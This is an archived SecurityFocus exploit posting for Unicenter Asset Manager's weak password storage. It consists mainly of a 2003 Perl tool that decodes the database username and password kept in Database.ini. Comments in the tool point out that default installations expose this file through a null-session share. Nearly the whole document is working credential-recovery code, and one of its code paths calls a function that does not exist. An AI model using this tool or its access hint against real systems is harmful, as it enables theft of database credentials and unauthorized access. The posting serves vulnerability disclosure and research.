source: http://www.securityfocus.com/bid/7808/info

It has been reported that Unicenter Asset Manager stores password information in a way that may be easily recovered. Because of this, an attacker may be able to gain access to potentially sensitive resources.

#!/usr/bin/perl
$version='ca-dbpwrecover 1.2 2003/03/19';
##
## (c) th at kufumo.com 2003
##
## this version was based on AMO Unicenter 3.2
##
## thanks to emf at kufumo.com and ssw at kufumo.com for help with the
## disassembly and helping to reverse the encoding algorithm! go daddy!
##
## can't find a suitable file?
##
## (a default installation has the file 'Database.ini' available via a
## nullsession share ("amdomain$") on the machine running the console/
## engine.)
##
##
$|=1;
##

$ironic_seed="NetCon"; ## we predict $ironic_seed will change
                       ## in the next version of CA AMO etc.

$CRYPT="BP7xCtDQqA2EZWoFH6wSIJeMzdYLb9Vfm5uNO4cKRGT3kUX018apyghijlnrsv";
$CLEAR="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";

use Getopt::Long;

GetOptions("h",
           "u=s" => \$uname,
           "p=s" => \$pword,
           "f=s" => \$file);

if($opt_h) {
    print <<EOM;
$version (c) 2003 th at kufumo.com
usage: ca-dbpwrecover [-h] [-u <username>] [-p <passwd>] [-f <file>]
  -h : this
  -p : password (if not using files)
  -u : username (if not using files)
  -f : filename (e.g. 'ca-dbpwrecover -f Database.ini')
EOM
    exit(1);
}

if($file) {
    DecryptCAEncryption("","",$file);
} else {
    if($pword && $uname) {
        DecryptCADecryption($pword,$uname,"");
        exit(0);
    } else {
        print "Not enough parameters. Try -h.\n";
        exit(1);
    }
}

exit();

sub DecryptCAEncryption {
    my($pword,$uname,$file)=@_;

    my($u,$c,$oa,$ob,$offset);

    my(@crypt)=split(//,$CRYPT);

    if($file) {
        open(IN,$file) || die "error: failed to open $file: $!\n";
        while(<IN>) {
            if(/^UserName=\#(\S+)\s*$/) {$name=$1;}
            if(/^Password=\#(\S+)\s*$/) {$pass=$1;}
        }
        close(IN);
    }

    $uname=$name if($name);
    $pword=$pass if($pass);

    @pass=split(//,$pword);
    @user=split(//,$uname);

    @nc=split(//,$ironic_seed);

    print "Username: ";

    $c=5;
    for($u=0;$u<@user;$u++) {

        ## find occurrance of current char ($user[$u]) in cleartext
        ## keystring:

        $_=$CLEAR;

        while(m/$user[$u]/g) {
            $oa=pos;
        }

        $oa++;

        if($u<@nc) {
            $_=$CRYPT;
            while(m/$nc[$u]/g) {
                $ob=pos;
            }
            $ob++;
            $oa=$oa+($ob*-1);
        } else {
            $oa=$oa-$u+$c;
            $c++;
        }

        while($oa<0) {
            $oa=$oa+62;
        }
        while($oa>62) {
            $oa=$oa-62;
        }

        $oa--;

        push(@clear,$crypt[$oa-1-$u]);

    }

    foreach(@clear) {
        print $_;
    }

    print "\n";

    ## who said reuse of code is a good thing?
    ## i think i failed class here. heck, did you want the tool or not?
    ##

    print "Password: ";

    $c=@clear;

    for($u=0;$u<@pass;$u++) {

        ## find occurrance of current char ($user[$u]) in cleartext
        ## keystring:

        $_=$CLEAR;

        while(m/$pass[$u]/g) {
            $oa=pos;
        }
        $oa++;

        if($u<@clear) {
            $_=$CRYPT;
            while(m/$clear[$u]/g) {
                $ob=pos;
            }
            $ob++;
            $oa=$oa+($ob*-1);
        } else {
            $oa=$oa-$u+$c-1;
            $c++;
        }

        while($oa<0) {
            $oa=$oa+62;
        }
        while($oa>62) {
            $oa=$oa-62;
        }

        $oa--;

        push(@cpass,$crypt[$oa-1-$u]);

    }

    foreach(@cpass) {
        print $_;
    }

    print "\n";

}